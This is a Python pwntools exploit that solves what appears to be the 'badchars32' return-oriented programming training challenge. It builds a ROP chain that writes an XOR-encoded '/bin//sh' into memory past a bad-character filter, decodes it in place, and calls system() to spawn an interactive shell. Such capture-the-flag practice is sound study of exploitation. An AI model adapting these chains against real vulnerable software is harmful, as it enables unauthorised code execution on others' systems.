#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

'''
>>> b = ['b','i','c','/',' ','f','n','s']
>>> badchars = [hex(ord(i)) for i in b]
>>> badchars
['0x62', '0x69', '0x63', '0x2f', '0x20', '0x66', '0x6e', '0x73']
>>>
'''

def write_mem(address, string):
    chain =  p32(0x8048899)   # pop esi; pop edi; ret
    chain += string
    chain += p32(address)
    chain += p32(0x8048893)   # mov [edi],esi; ret
    return chain

def decode(address, key):
    chain  = p32(0x8048896)   # pop ebx ; pop ecx ; ret
    chain += p32(address)
    chain += p32(key)
    chain += p32(0x8048890)   # xor [ebx],cl; ret
    return chain

# key = hex(ord('a')) = 0x61
def encode(s,key):
    return ''.join(chr(ord(i)^key) for i in s)

def exploit():
    p = process('./badchars32')
    binary = ELF("badchars32", checksec=False)
    systemPLT = binary.symbols["system"]
    address = 0x0804a0c8  # address to start write to
    key = 0x61

    # create payload
    payload = 44*"A"
    payload += write_mem(address,   encode('/bin',key)) # write '/bin' (encoded) into memory
    payload += write_mem(address+4, encode('//sh',key)) # write '//sh' (encoded) into memory + 4
    for i in range(len('/bin//sh')):
    	payload += decode((address + i), key)
    payload += p32(systemPLT)
    payload += p32(0xcafebabe)
    payload += p32(address)

    p.sendlineafter('> ', payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
#_EOF